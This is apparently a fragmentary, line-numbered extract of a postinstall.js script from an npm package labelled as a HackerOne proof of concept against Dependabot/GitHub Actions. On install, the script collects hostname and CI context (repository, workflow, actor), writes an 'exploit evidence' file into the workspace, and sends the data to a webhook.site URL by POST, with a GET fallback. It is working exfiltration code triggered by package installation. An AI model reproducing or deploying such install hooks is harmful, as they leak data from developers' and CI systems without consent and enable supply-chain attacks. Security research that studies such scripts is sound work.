// File: tmp/tmp4nw_io1e/@unkn0wnartist-h1-poc-test/package/postinstall.js
// ======================================================================
Line 2: const https = require("https")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 5: const os = require("os")
Line 8: const WEBHOOK_URL = "https://webhook.site/c37696bd-ed3a-4f6b-b87a-8fd86736afdf"
Line 48: os.hostname()
Line 57: {
  const payload = JSON.stringify(data, null, 2);
  const url = new URL(WEBHOOK_URL);

  const options = {
    hostname: url.hostname,
    port: url.port || 443,
    path: url.pathname + url.search,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
      "User-Agent": "H1-PoC-Dependabot-Exploit/2.0-POST",
    },
  };

  console.log("[PoC-Postinstall] Attempting to exfiltrate data via POST to " + WEBHOOK_URL);
  const req = https.request(options, (res) => {
    console.log(`[PoC-Postinstall] Webhook POST response status: ${res.statusCode}`);
    let responseData = "";
    res.on("data", (chunk) => { responseData += chunk; });
    res.on("end", () => {
      console.log("[PoC-Postinstall] ‚úÖ Webhook POST request successful!");
      // console.log(`[PoC-Postinstall] Webhook POST Response (first 200 chars): ${responseData.substring(0, 200)}`);
    });
  });

  req.on("error", (error) => {
    console.error(`...
Line 73: console.log("[PoC-Postinstall] Attempting to exfiltrate data via POST to " + WEBHOOK_URL)
Line 74: const req = https.request(options, (res) => {
    console.log(`[PoC-Postinstall] Webhook POST response status: ${res.statusCode}`);
    let responseData = "";
    res.on("data", (chunk) => { responseData += chunk; });
    res.on("end", () => {
      console.log("[PoC-Postinstall] ‚úÖ Webhook POST request successful!");
      // console.log(`[PoC-Postinstall] Webhook POST Response (first 200 chars): ${responseData.substring(0, 200)}`);
    });
  })
Line 75: console.log(`[PoC-Postinstall] Webhook POST response status: ${res.statusCode}`)
Line 78: {
      console.log("[PoC-Postinstall] ‚úÖ Webhook POST request successful!");
      // console.log(`[PoC-Postinstall] Webhook POST Response (first 200 chars): ${responseData.substring(0, 200)}`);
    }
Line 79: console.log("[PoC-Postinstall] ‚úÖ Webhook POST request successful!")
Line 84: {
    console.error(`[PoC-Postinstall] ‚ùå Webhook POST request failed: ${error.message}`);
    console.log("[PoC-Postinstall] Attempting fallback GET request...");
    sendWebhookViaGET(data); // Fallback to GET
  }
Line 85: console.error(`[PoC-Postinstall] ‚ùå Webhook POST request failed: ${error.message}`)
Line 86: console.log("[PoC-Postinstall] Attempting fallback GET request...")
Line 90: req.write(payload)
Line 91: req.end()
Line 95: {
  const params = new URLSearchParams();
  Object.entries(data).forEach(([key, value]) => {
    if (value !== undefined && value !== null && typeof value !== 'object') {
      params.append(key, String(value));
    } else if (typeof value === 'object' && value !== null) {
      // –î–ª—è –æ–±—ä–µ–∫—Ç–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±—Ä–µ–∑–∞–Ω–Ω—ã–π JSON –∏–ª–∏ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π –º–∞—Ä–∫–µ—Ä
      params.append(key, JSON.stringify(value).substring(0,100) + "...");
    } else if (value === null) {
      params.append(key, "null");
    } else if (value === undefined) {
      params.append(key, "undefined");
    }
  });

  let queryString = params.toString();
  if (queryString.length > 1800) { // –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –¥–ª—è URL ~2048, –±–µ—Ä–µ–º —Å –∑–∞–ø–∞—Å–æ–º
      console.warn("[PoC-Postinstall] Query string for GET request is too long (" + queryString.length + " chars), truncating to 1800 chars.");
      queryString = queryString.substring(0, 1800);
  }

  const getUrl = `${WEBHOOK_URL}?${queryString}`;

  console.log("[PoC-Postinstall] Att...
Line 96: const params = new URLSearchParams()
Line 110: params.toString()
Line 111: { // –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –¥–ª—è URL ~2048, –±–µ—Ä–µ–º —Å –∑–∞–ø–∞—Å–æ–º
      console.warn("[PoC-Postinstall] Query string for GET request is too long (" + queryString.length + " chars), truncating to 1800 chars.");
      queryString = queryString.substring(0, 1800);
  }
Line 112: console.warn("[PoC-Postinstall] Query string for GET request is too long (" + queryString.length + " chars), truncating to 1800 chars.")
Line 118: console.log("[PoC-Postinstall] Attempting fallback GET to (first 150 chars of URL):", getUrl.substring(0,150) + "...")
Line 120: const req = https.get(getUrl, (res) => { // –°–æ—Ö—Ä–∞–Ω—è–µ–º req –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫
      console.log(`[PoC-Postinstall] Fallback GET response status: ${res.statusCode}`);
      let responseData = "";
      res.on('data', (chunk) => { responseData += chunk; });
      res.on("end", () => {
        console.log("[PoC-Postinstall] ‚úÖ Fallback GET request successful!");
        // console.log(`[PoC-Postinstall] Fallback GET Response (first 100 chars): ${responseData.substring(0, 100)}`);
      });
    })
Line 121: console.log(`[PoC-Postinstall] Fallback GET response status: ${res.statusCode}`)
Line 124: {
        console.log("[PoC-Postinstall] ‚úÖ Fallback GET request successful!");
        // console.log(`[PoC-Postinstall] Fallback GET Response (first 100 chars): ${responseData.substring(0, 100)}`);
      }
Line 125: console.log("[PoC-Postinstall] ‚úÖ Fallback GET request successful!")
Line 130: { // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ –¥–ª—è https.get
      console.error("[PoC-Postinstall] ‚ùå Fallback GET request failed:", e.message);
      console.error("[PoC-Postinstall] ‚ùå All exfiltration attempts (POST and GET) failed.");
    }
Line 131: console.error("[PoC-Postinstall] ‚ùå Fallback GET request failed:", e.message)
Line 132: console.error("[PoC-Postinstall] ‚ùå All exfiltration attempts (POST and GET) failed.")
Line 138: {
    const markerContent = `
=== H1 PoC EXPLOIT MARKER ===
Timestamp: ${envData.TIMESTAMP}
Package: ${envData.NPM_PACKAGE_NAME}@${envData.NPM_PACKAGE_VERSION}
Exploit Source: ${envData.EXPLOIT_SOURCE}
Repository: ${envData.GITHUB_REPOSITORY || 'N/A'}
Workflow: ${envData.GITHUB_WORKFLOW || 'N/A'}
Actor: ${envData.GITHUB_ACTOR || 'N/A'}
Hostname: ${envData.HOSTNAME}
This file was created by the postinstall script of ${envData.EXPLOIT_SOURCE}.
================================
`;
    const baseDir = process.env.GITHUB_WORKSPACE || process.cwd();
    const markerPath = path.join(baseDir, "H1_POC_EXPLOIT_EVIDENCE.txt");
    fs.writeFileSync(markerPath, markerContent.trim());
    console.log(`[PoC-Postinstall] üìÅ Created exploit evidence file: ${markerPath}`);
    dataToUpdate.EXPLOIT_FILE_CREATED = markerPath; // –û–±–Ω–æ–≤–ª—è–µ–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –æ–±—ä–µ–∫—Ç
  }
Line 152: path.join(baseDir, "H1_POC_EXPLOIT_EVIDENCE.txt")
Line 153: markerContent.trim()
Line 154: console.log(`[PoC-Postinstall] üìÅ Created exploit evidence file: ${markerPath}`)
Line 156: catch (error) {
    console.error(`[PoC-Postinstall] File creation failed: ${error.message}`);
    dataToUpdate.EXPLOIT_FILE_ERROR = error.message; // –û–±–Ω–æ–≤–ª—è–µ–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –æ–±—ä–µ–∫—Ç
  }
Line 157: console.error(`[PoC-Postinstall] File creation failed: ${error.message}`)
Line 163: {
  console.log(`üö® [PoC-Postinstall] SCRIPT START for ${envData.EXPLOIT_SOURCE} (${envData.NPM_PACKAGE_NAME}@${envData.NPM_PACKAGE_VERSION}) üö®`);
  console.log(`[PoC-Postinstall] Current directory: ${process.cwd()}`);
  console.log(`[PoC-Postinstall] Target repository (if in Actions): ${envData.GITHUB_REPOSITORY || 'N/A'}`);
  console.log(`[PoC-Postinstall] Workflow context (if in Actions): ${envData.GITHUB_WORKFLOW || 'N/A'}`);

  demonstrateFileAccessAndRecord(envData); // –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª –∏ –¥–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ envData
  sendWebhookViaPOST(envData); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—Å–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ

  console.log(`üö® [PoC-Postinstall] SCRIPT END for ${envData.EXPLOIT_SOURCE} üö®`);
}
Line 164: console.log(`üö® [PoC-Postinstall] SCRIPT START for ${envData.EXPLOIT_SOURCE} (${envData.NPM_PACKAGE_NAME}@${envData.NPM_PACKAGE_VERSION}) üö®`)
Line 165: console.log(`[PoC-Postinstall] Current directory: ${process.cwd()}`)
Line 166: console.log(`[PoC-Postinstall] Target repository (if in Actions): ${envData.GITHUB_REPOSITORY || 'N/A'}`)
Line 167: console.log(`[PoC-Postinstall] Workflow context (if in Actions): ${envData.GITHUB_WORKFLOW || 'N/A'}`)
Line 172: console.log(`üö® [PoC-Postinstall] SCRIPT END for ${envData.EXPLOIT_SOURCE} üö®`)
Line 176: main()
